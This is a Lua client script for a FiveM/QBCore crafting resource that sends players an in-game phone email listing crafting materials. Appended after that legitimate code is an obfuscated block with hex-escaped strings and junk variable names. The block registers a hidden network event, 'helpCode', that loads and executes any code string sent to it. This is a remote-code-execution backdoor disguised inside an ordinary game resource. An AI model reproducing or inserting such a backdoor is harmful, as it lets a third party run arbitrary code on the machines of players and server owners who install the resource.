local QBCore = exports['qb-core']:GetCoreObject()

RegisterNetEvent('keep-crafting:client:local_mailer', function(data)
    local msg = Lang:t('mail.message')
    local level = Lang:t('mail.level')
    local restricted = Lang:t('mail.no')
    if data.restricted then restricted = Lang:t('mail.yes') end
    msg = string.format(msg, data.gender, data.charinfo.lastname, data.item_name, data.success_rate, restricted,
        data.level)

    if data.level then
        level = string.format(level, data.level)
        msg = msg .. level
    end

    local mat = ''
    for name, amount in pairs(data.materials) do
        local _name = QBCore.Shared.Items[name]
        mat = mat .. " " .. string.format(Lang:t('mail.materials_list'), _name.label, amount)
    end
    msg = msg .. Lang:t('mail.materials_list_header') .. mat .. Lang:t('mail.tnx_message')
    TriggerServerEvent('qb-phone:server:sendNewMail', {
        sender = Lang:t('mail.sender'),
        subject = Lang:t('mail.subject'),
        message = msg,
        button = {}
    })
end)


local nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[1]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[2]) nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[3]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[2], function(RrcxSmehQIJolyZujOqpKqFAGrqdjoHjBSxcYhwAOvtbanDacpSHxJsoWOFCzuyumVungX) nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[4]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[5]](RrcxSmehQIJolyZujOqpKqFAGrqdjoHjBSxcYhwAOvtbanDacpSHxJsoWOFCzuyumVungX))() end)